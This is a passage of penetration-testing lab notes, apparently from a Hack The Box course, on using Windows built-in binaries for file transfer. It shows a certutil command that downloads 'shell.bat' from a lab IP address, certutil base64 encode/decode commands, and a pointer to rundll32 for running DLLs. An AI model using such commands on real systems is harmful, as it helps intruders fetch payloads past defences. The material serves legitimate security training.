
[Certutil](certutil.exe) is intended use is for handling certificates but can also be used to transfer files by either downloading a file to disk or base64 encoding/decoding a file.

```PowerShell
PS C:\htb> certutil.exe -urlcache -split -f http://10.10.14.3:8080/shell.bat shell.bat
### Downloading a file

C:\htb> certutil -encode file1 encodedfile
C:\htb> certutil -decode encodedfile file2
### Encoding and Decoding to/from base64
```

A binary such as [rundll32.exe](https://lolbas-project.github.io/lolbas/Binaries/Rundll32/) can be used to execute a DLL file.

---